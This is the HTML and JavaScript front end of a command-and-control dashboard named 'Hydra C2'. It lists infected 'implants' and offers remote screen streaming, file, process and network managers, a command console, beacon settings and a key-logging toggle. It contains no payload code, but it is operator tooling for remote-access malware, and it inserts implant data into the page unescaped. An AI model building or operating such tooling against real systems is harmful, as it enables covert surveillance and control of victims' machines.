<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hydra C2 Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="/static/css/dashboard.css" rel="stylesheet">
</head>

<body class="bg-light">
    <div class="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar" class="bg-dark text-light">
            <div class="sidebar-header">
                <h3>Hydra C2</h3>
            </div>
            <ul class="list-unstyled components">
                <li class="active">
                    <a href="#implants">
                        <i class="fas fa-robot"></i> Implants
                    </a>
                </li>
                <li>
                    <a href="#remote-control">
                        <i class="fas fa-desktop"></i> Remote Control
                    </a>
                </li>
                <li>
                    <a href="#file-manager">
                        <i class="fas fa-folder"></i> File Manager
                    </a>
                </li>
                <li>
                    <a href="#process-manager">
                        <i class="fas fa-tasks"></i> Process Manager
                    </a>
                </li>
                <li>
                    <a href="#network">
                        <i class="fas fa-network-wired"></i> Network
                    </a>
                </li>
                <li>
                    <a href="#settings">
                        <i class="fas fa-cog"></i> Settings
                    </a>
                </li>
                <li>
                    <a href="#" onclick="logout()">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </a>
                </li>
            </ul>
        </nav>

        <!-- Page Content -->
        <div id="content">
            <!-- Top Navigation -->
            <nav class="navbar navbar-expand-lg navbar-light bg-light">
                <div class="container-fluid">
                    <button type="button" id="sidebarCollapse" class="btn btn-dark">
                        <i class="fas fa-bars"></i>
                    </button>
                    <div class="ms-auto">
                        <div class="dropdown">
                            <button class="btn btn-secondary dropdown-toggle" type="button" id="themeDropdown"
                                data-bs-toggle="dropdown">
                                <i class="fas fa-palette"></i> Theme
                            </button>
                            <ul class="dropdown-menu">
                                <li><a class="dropdown-item" href="#" onclick="setTheme('light')">Light</a></li>
                                <li><a class="dropdown-item" href="#" onclick="setTheme('dark')">Dark</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </nav>

            <!-- Main Content Area -->
            <div class="container-fluid">
                <!-- Implants Section -->
                <div id="implants" class="content-section">
                    <h2>Active Implants</h2>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="card">
                                <div class="card-body">
                                    <table id="implants-table" class="table table-striped">
                                        <thead>
                                            <tr>
                                                <th>ID</th>
                                                <th>Hostname</th>
                                                <th>IP</th>
                                                <th>OS</th>
                                                <th>Last Seen</th>
                                                <th>Status</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Remote Control Section -->
                <div id="remote-control" class="content-section d-none">
                    <h2>Remote Control</h2>
                    <div class="row">
                        <div class="col-md-8">
                            <div class="card">
                                <div class="card-body">
                                    <div id="screen-view" class="screen-container">
                                        <img id="screen-capture" src="" alt="Screen Capture" class="img-fluid">
                                    </div>
                                    <div class="mt-3">
                                        <button class="btn btn-primary" onclick="captureScreen()">
                                            <i class="fas fa-camera"></i> Capture Screen
                                        </button>
                                        <button class="btn btn-success" onclick="startScreenStream()">
                                            <i class="fas fa-play"></i> Start Stream
                                        </button>
                                        <button class="btn btn-danger" onclick="stopScreenStream()">
                                            <i class="fas fa-stop"></i> Stop Stream
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="card">
                                <div class="card-body">
                                    <h5>System Information</h5>
                                    <div id="system-info">
                                        <p><strong>OS:</strong> <span id="os-info">-</span></p>
                                        <p><strong>IP:</strong> <span id="ip-info">-</span></p>
                                        <p><strong>Last Seen:</strong> <span id="last-seen">-</span></p>
                                        <p><strong>CPU Usage:</strong> <span id="cpu-usage">-</span></p>
                                        <p><strong>Memory Usage:</strong> <span id="memory-usage">-</span></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- File Manager Section -->
                <div id="file-manager" class="content-section d-none">
                    <h2>File Manager</h2>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between mb-3">
                                        <div class="btn-group">
                                            <button class="btn btn-primary" onclick="navigateUp()">
                                                <i class="fas fa-level-up-alt"></i> Up
                                            </button>
                                            <button class="btn btn-success" onclick="refreshFiles()">
                                                <i class="fas fa-sync"></i> Refresh
                                            </button>
                                        </div>
                                        <div class="input-group" style="width: 50%;">
                                            <input type="text" id="path-input" class="form-control"
                                                placeholder="Current Path">
                                            <button class="btn btn-primary" onclick="navigateToPath()">Go</button>
                                        </div>
                                    </div>
                                    <table id="file-list" class="table table-striped">
                                        <thead>
                                            <tr>
                                                <th>Name</th>
                                                <th>Size</th>
                                                <th>Modified</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Process Manager Section -->
                <div id="process-manager" class="content-section d-none">
                    <h2>Process Manager</h2>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between mb-3">
                                        <button class="btn btn-primary" onclick="refreshProcesses()">
                                            <i class="fas fa-sync"></i> Refresh
                                        </button>
                                        <div class="input-group" style="width: 50%;">
                                            <input type="text" id="process-search" class="form-control"
                                                placeholder="Search processes...">
                                            <button class="btn btn-primary">
                                                <i class="fas fa-search"></i>
                                            </button>
                                        </div>
                                    </div>
                                    <table id="process-list" class="table table-striped">
                                        <thead>
                                            <tr>
                                                <th>PID</th>
                                                <th>Name</th>
                                                <th>User</th>
                                                <th>Memory</th>
                                                <th>CPU</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Network Section -->
                <div id="network" class="content-section d-none">
                    <h2>Network Monitor</h2>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between mb-3">
                                        <button class="btn btn-primary" onclick="refreshConnections()">
                                            <i class="fas fa-sync"></i> Refresh
                                        </button>
                                        <button class="btn btn-success" onclick="startCapture()">
                                            <i class="fas fa-play"></i> Start Capture
                                        </button>
                                        <button class="btn btn-danger" onclick="stopCapture()">
                                            <i class="fas fa-stop"></i> Stop Capture
                                        </button>
                                    </div>
                                    <table id="connections-list" class="table table-striped">
                                        <thead>
                                            <tr>
                                                <th>Protocol</th>
                                                <th>Local Address</th>
                                                <th>Remote Address</th>
                                                <th>State</th>
                                                <th>PID</th>
                                                <th>Program</th>
                                            </tr>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Settings Section -->
                <div id="settings" class="content-section d-none">
                    <h2>Settings</h2>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="card">
                                <div class="card-body">
                                    <h5>General Settings</h5>
                                    <form id="settings-form">
                                        <div class="mb-3">
                                            <label class="form-label">Beacon Interval (seconds)</label>
                                            <input type="number" class="form-control" id="beacon-interval" min="1"
                                                max="3600">
                                        </div>
                                        <div class="mb-3">
                                            <label class="form-label">Screenshot Quality</label>
                                            <select class="form-select" id="screenshot-quality">
                                                <option value="high">High</option>
                                                <option value="medium">Medium</option>
                                                <option value="low">Low</option>
                                            </select>
                                        </div>
                                        <div class="mb-3">
                                            <label class="form-label">Key Logging</label>
                                            <div class="form-check form-switch">
                                                <input class="form-check-input" type="checkbox" id="key-logging">
                                            </div>
                                        </div>
                                        <button type="submit" class="btn btn-primary">Save Settings</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card">
                                <div class="card-body">
                                    <h5>Security Settings</h5>
                                    <form id="security-form">
                                        <div class="mb-3">
                                            <label class="form-label">Encryption Key</label>
                                            <input type="password" class="form-control" id="encryption-key">
                                        </div>
                                        <div class="mb-3">
                                            <label class="form-label">Allowed IPs</label>
                                            <textarea class="form-control" id="allowed-ips" rows="3"></textarea>
                                        </div>
                                        <div class="mb-3">
                                            <label class="form-label">Geofencing</label>
                                            <div class="form-check form-switch">
                                                <input class="form-check-input" type="checkbox" id="geofencing">
                                            </div>
                                        </div>
                                        <button type="submit" class="btn btn-primary">Save Security Settings</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Command Console Modal -->
    <div class="modal fade" id="commandConsole" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Command Console</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div id="console-output" class="console-window"></div>
                    <div class="input-group mt-3">
                        <input type="text" id="command-input" class="form-control" placeholder="Enter command...">
                        <button class="btn btn-primary" id="send-command">Send</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Alert container -->
    <div id="alerts-container" class="position-fixed bottom-0 end-0 p-3"></div>

    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Add early token check
        const tokenCheck = () => {
            const token = localStorage.getItem('token');
            if (!token) {
                console.error('No token found, redirecting to login');
                window.location.href = '/login';
                return false;
            }
            return true;
        };
        
        // Execute token check immediately
        if (!tokenCheck()) {
            throw new Error('Authentication check failed');
        }

        // Global function to update implants table - needed by WebSocketManager
        function updateImplantsTable(implants) {
            const tbody = document.querySelector('#implants-table tbody');
            tbody.innerHTML = '';

            implants.forEach(implant => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${implant.id}</td>
                    <td>${implant.hostname}</td>
                    <td>${implant.ip}</td>
                    <td>${implant.os}</td>
                    <td>${new Date(implant.last_seen).toLocaleString()}</td>
                    <td><span class="badge bg-${implant.status === 'online' ? 'success' : 'danger'}">${implant.status}</span></td>
                    <td>
                        <button class="btn btn-sm btn-primary" onclick="viewImplant('${implant.id}')">View</button>
                        <button class="btn btn-sm btn-danger" onclick="deleteImplant('${implant.id}')">Delete</button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }
        
        // Check authentication on page load
        document.addEventListener('DOMContentLoaded', function () {
            const token = localStorage.getItem('token');
            if (!token) {
                window.location.href = '/login';
                return;
            }
            initializeDashboard();
        });

        // Initialize dashboard functionality
        function initializeDashboard() {
            // Load initial data via REST API
            loadImplants();
            
            // Set up periodic refresh of implants via REST API as fallback
            setInterval(loadImplants, 10000); // Refresh every 10 seconds
        }

        // Function to load implants
        async function loadImplants() {
            try {
                const token = localStorage.getItem('token');
                if (!token) {
                    logout();
                    return;
                }
                
                const response = await fetch('/api/clients', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.status === 401) {
                    // Token expired or invalid
                    logout();
                    return;
                }
                
                const implants = await response.json();
                updateImplantsTable(implants);
            } catch (error) {
                console.error('Error loading implants:', error);
            }
        }

        // Function to check authentication
        async function checkAuthentication() {
            try {
                const token = localStorage.getItem('token');
                if (!token) {
                    logout();
                    return;
                }

                const response = await fetch('/api/clients', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });

                if (response.status === 401) {
                    logout();
                }
            } catch (error) {
                console.error('Authentication check failed:', error);
            }
        }

        // Logout function
        function logout() {
            localStorage.removeItem('token');
            window.location.href = '/login';
        }

        // Initialize sidebar toggle
        document.getElementById('sidebarCollapse').addEventListener('click', function () {
            document.getElementById('sidebar').classList.toggle('active');
        });
    </script>
    <script src="/static/js/websocket-manager.js"></script>
    <script src="/static/js/implants.js"></script>
    <script src="/static/js/remote-control.js"></script>
    <script src="/static/js/file-manager.js"></script>
    <script src="/static/js/process-manager.js"></script>
    <script src="/static/js/network.js"></script>
    <script src="/static/js/settings.js"></script>
</body>

</html>